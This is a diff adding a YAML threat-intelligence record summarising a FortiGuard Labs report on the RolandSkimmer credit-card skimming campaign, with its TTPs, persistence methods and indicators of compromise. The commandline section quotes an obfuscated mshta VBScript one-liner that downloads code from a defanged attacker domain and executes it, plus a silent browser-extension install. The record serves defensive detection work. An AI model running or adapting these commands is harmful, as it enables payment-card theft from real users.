@@ -1,0 +1,70 @@
+description: FortiGuard Labs reports on a sophisticated credit card skimming campaign
+  dubbed RolandSkimmer, targeting users in Bulgaria with malicious browser extensions
+  across Chrome, Edge, and Firefox. The attack uses deceptive LNK files and obfuscated
+  scripts to harvest financial data.
+attribution: Unknown (attributed to threat actors targeting users in Bulgaria)
+malware_families:
+- RolandSkimmer
+TTPs:
+  processes:
+  - mshta.exe
+  - msedge.exe
+  - firefox.exe
+  commandline:
+  - '"C:\\Windows\\System32\\mshta.exe" "faktura_1065170.lnk"'
+  - 'C:\WiNDOws\SYsTEM32\MShTA.exe vbscript:execute("SeT mi1=CReATeobjECt(\"msxmL2.SErverXMlHTtp.6.0\"):mi1.OpEN \"geT\",\"Hxxp://iNVsetmX[.]cOM/ipa.AsPX\",faLSe:mi1.SEnD():rANdOMize:R=INt(rnD*99999):ExECute(REpLAce(mI1.REsponSEtEXt,\"#\", R)):")(wiNDoW.ClosE)'
+  - '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --extension-install
+    %APPDATA%\\..\\Local\\s2ch97\\manifest.json'
+  powershell: []
+  scripting_engine:
+  - VBScript
+  - JavaScript
+  registry_keys:
+  - '%APPDATA%\\..\\Local\\s2ch97\\'
+  image_load: []
+  network_connections:
+  - executable: msedge.exe
+    destination_address: invsetmx[.]com
+    port: ''
+    url: hxxp://invsetmx[.]com/n.jpg
+  - executable: firefox.exe
+    destination_address: fzhivka-001-site1[.]btempurl[.]com
+    port: ''
+    url: ''
+  file_modifications:
+  - '"%APPDATA%\\..\\Local\\s2ch97\\manifest.json"'
+  - '"%APPDATA%\\..\\Local\\s2ch97\\background.js"'
+  - '"%APPDATA%\\..\\Local\\s2ch97\\background2.js"'
+  persistence:
+  - Malicious browser extension installed
+  - Legitimate Edge shortcuts replaced with malicious ones
+  - Copying Microsoft Edge executable to %APPDATA%\\Edge SxS
+  pipes: []
+  process_relations: []
+IOCs:
+- invsetmx[.]com
+- fzhivka-001-site1[.]btempurl[.]com
+- exmkleo[.]com
+- bg3dsec[.]com
+- zzigi20-001-site1.atempurl.com
+- topclima-001-site1.itempurl.com
+- rinootracebg-001-site1.etempurl.com
+- mgproperties-001-site1.itempurl.com
+- kleoti-001-site1.htempurl.com
+- Rol@and4You
+- kuka
+- key2
+- 80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515
+- e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908
+- e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d
+- 86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1
+- 7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0
+- 4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2
+- cd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53
+- c02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4
+- 5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c
+authors:
+- Cara Lin, FortiGuard Labs Threat Research
+reference: https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered
+date_of_publication: April 02, 2025
+file_creation_date: May 14, 2025
